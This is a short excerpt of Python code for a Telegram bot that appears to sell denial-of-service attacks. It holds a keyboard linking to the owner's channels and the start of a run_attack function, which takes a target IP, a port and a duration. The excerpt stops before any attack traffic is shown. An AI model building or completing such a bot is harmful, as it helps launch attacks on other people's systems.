...
def get_support_keyboard():
    keyboard = [
        [InlineKeyboardButton("👑 𝗢𝗪𝗡𝗘𝗥 👑", url="https://t.me/@Prime_X_Army")],
        [InlineKeyboardButton("📢 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 📢", url="https://t.me/smalldevloper")],
        [InlineKeyboardButton("💰 𝗣𝗥𝗢𝗢𝗙 💰", url="https://t.me/PRIMEXARMY_OFFICIAL")],
    ]
...
async def run_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE, uid: int, ip: str, port: int, dur: int, msg):
    """Background task to run attack with live 300 seconds countdown"""
    try:
        await msg.edit_text(
            f"🚀 *INITIATING ATTACK* 🚀\n\n"
            f"🎯 Target: `{ip}:{port}`\n"
